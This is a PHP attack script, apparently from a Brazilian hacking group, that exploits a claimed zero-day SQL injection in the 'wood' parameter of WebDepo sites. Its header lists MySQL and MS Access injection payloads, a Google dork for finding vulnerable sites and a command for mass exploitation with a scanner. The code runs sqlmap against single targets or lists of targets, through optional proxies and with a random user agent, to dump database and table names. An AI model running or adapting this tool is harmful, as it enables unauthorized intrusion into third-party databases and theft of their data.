    <?php
     
    /*
     
      # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
      # Blog:         http://blog.inurl.com.br
      # Twitter:      https://twitter.com/googleinurl
      # Fanpage:      https://fb.com/InurlBrasil
      # Pastebin      http://pastebin.com/u/Googleinurl
      # GIT:          https://github.com/googleinurl
      # PSS:          http://packetstormsecurity.com/user/googleinurl
      # YOUTUBE:      http://youtube.com/c/INURLBrasil
      # PLUS:         http://google.com/+INURLBrasil
     
     
      # EXPLOIT NAME: MINI exploit-SQLMAP - (0DAY) WebDepo -SQL 
injection / INURL BRASIL
      # VENTOR:       http://www.webdepot.co.il
      # GET VULN:     wood=(id)
      # $wood=intval($_REQUEST['wood'])
      
-----------------------------------------------------------------------------
     
      # DBMS: 'MySQL'
      # Exploit:      +AND+(SELECT 8880 FROM(SELECT 
COUNT(*),CONCAT(0x496e75726c42726173696c,0x3a3a,version(),(SELECT (CASE 
WHEN (8880=8880) THEN 1 ELSE 0 END)),0x717a727a71,FLOOR(RAND(0)*2))x 
FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
     
      # DBMS: 'Microsoft Access'
      # Exploit:      
+UNION+ALL+SELECT+NULL,NULL,NULL,CHR(113)&CHR(112)&CHR(120)&CHR(112)&CHR(113)&CHR(85)&CHR(116)&CHR(106)&CHR(110)&CHR(108)&CHR(90)&CHR(74)&CHR(113)&CHR(88)&CHR(116)&CHR(113)&CHR(118)&CHR(111)&CHR(100)&CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL 
FROM MSysAccessObjects%16
      
-----------------------------------------------------------------------------
     
      # http://target.us/text.asp?wood=(id)+Exploit
     
      # GOOGLE DORK:   inurl:text.asp?wood=
     
      # --help:
      -t : SET TARGET.
      -f : SET FILE TARGETS.
      -p : SET PROXY
      Execute:
      php WebDepoxpl.php -t target
      php WebDepoxpl.php -f targets.txt
      php WebDepoxpl.php -t target -p 'http://localhost:9090'
      
-----------------------------------------------------------------------------
     
      # EXPLOIT MASS USE SCANNER INURLBR
      # COMMAND: ./inurlbr.php --dork 'inurl:text.asp?wood=' -s 
0dayWebDepo.txt -q 1,6 --exploit-get "?´'0x27" --comand-vul "php 
WebDepoxpl.php -t '_TARGET_'"
      # DOWNLOAD INURLBR: https://github.com/googleinurl/SCANNER-INURLBR
      
-----------------------------------------------------------------------------
     
     */
     
     
    error_reporting(1);
    set_time_limit(0);
    ini_set('display_errors', 1);
    ini_set('max_execution_time', 0);
    ini_set('allow_url_fopen', 1);
    ob_implicit_flush(true);
    ob_end_flush();
    $folder_SqlMap = "python ../sqlmap/sqlmap.py";
    $op_ = getopt('f:t:p:', array('help::'));
    echo "  
     _____
    (_____)    ____ _   _ _    _ _____  _                 ____                
_ _
    (() ())  |_   _| \ | | |  | |  __ \| |               |  _ \              
(_) |
     \   /     | | |  \| | |  | | |__) | |       ______  | |_) |_ __ __ 
_ ___ _| |
      \ /      | | | . ` | |  | |  _  /| |      |______| |  _ <| '__/ _` 
/ __| | |
      /=\     _| |_| |\  | |__| | | \ \| |____           | |_) | | | (_| 
\__ \ | |
     [___]   |_____|_| \_|\____/|_|  \_\______|          |____/|_|  
\__,_|___/_|_|
     \n\033[1;37m0xNeither war between hackers, nor peace for the 
system.\n
    [+] [Exploit]: MINI 3xplo1t-SqlMap - (0DAY) WebDepo -SQL injection / 
INURL BRASIL\nhelp: --help\033[0m\n\n";
    $menu = "
       -t : SET TARGET.
       -f : SET FILE TARGETS.
       -p : SET PROXY
       Execute:
                     php WebDepoxpl.php -t target
                     php WebDepoxpl.php -f targets.txt
                     php WebDepoxpl.php -t target -p 
'http://localhost:9090'
    \n";
    echo isset($op_['help']) ? exit($menu) : NULL;
     
    $params = array(
        'target' => not_isnull_empty($op_['t']) ? (strstr($op_['t'], 
'http') ? $op_['t'] : "http://{$op_['t']}") : NULL,
        'file' => !not_isnull_empty($op_['t']) && 
not_isnull_empty($op_['f']) ? $op_['f'] : NULL,
        'proxy' => not_isnull_empty($op_['p']) ? "--proxy '{$op_['p']}'" 
: NULL,
        'folder' => $folder_SqlMap,
        'line' => 
"-----------------------------------------------------------------------------------"
    );
     
    not_isnull_empty($params['target']) && 
not_isnull_empty($params['file']) ? exit("[X] [ERRO] DEFINE TARGET OR 
FILE TARGET\n") : NULL;
    not_isnull_empty($params['target']) ? __exec($params) . exit() : 
NULL;
    not_isnull_empty($params['file']) ? __listTarget($params) . exit() : 
NULL;
     
    function not_isnull_empty($valor = NULL) {
        RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
    }
     
    function __plus() {
        ob_flush();
        flush();
    }
     
    function __listTarget($file) {
        $tgt_ = array_unique(array_filter(explode("\n", 
file_get_contents($file['file']))));
        echo "\n\033[1;37m[!] [" . date("H:i:s") . "] [INFO] TOTAL 
TARGETS LOADED : " . count($tgt_) . "\033[0m\n";
        foreach ($tgt_ as $url) {
            echo "\033[1;37m[+] [" . date("H:i:s") . "] [INFO] SCANNING 
: {$url} \033[0m\n";
            __plus();
            $file['target'] = $url;
            __exec($file) . __plus();
        }
    }
     
    function __exec($params) {
        __plus();
        echo "\033[1;37m{$params['line']}\n[!] [" . date("H:i:s") . "] 
[INFO] starting SqlMap...\n";
        echo "[+] [" . date("H:i:s") . "] [INFO] TARGET: 
{$params['target']}/text.asp?wood={SQL-INJECTION}\033[0m\n";
        $command = "python {$params['folder']} -u 
'{$params['target']}/text.asp?wood=1' -p wood --batch --dbms=MySQL 
{$params['proxy']} --random-agent --answers='follow=N' --dbs --tables";
        system($command, $dados) . empty($dados[0]) ? exit() : NULL;
        __plus();
    }
